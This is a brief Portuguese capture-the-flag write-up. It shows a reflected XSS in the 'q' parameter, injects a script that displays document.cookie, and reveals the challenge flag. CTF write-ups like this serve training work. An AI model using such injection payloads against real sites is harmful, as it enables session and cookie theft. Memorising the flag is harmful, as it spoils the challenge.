# Write-up — T1 Glitch na Simulação

1. Acesse `/?q=teste` e note que o valor é refletido sem sanitização.
2. Execute `<script>alert(document.cookie)</script>` como valor do parâmetro `q`.
3. A janela exibirá `fragmento_oraculo=CTF{Trinity_Glitch_Vigilia}`.
4. Copie o valor da flag e entregue à resistência.
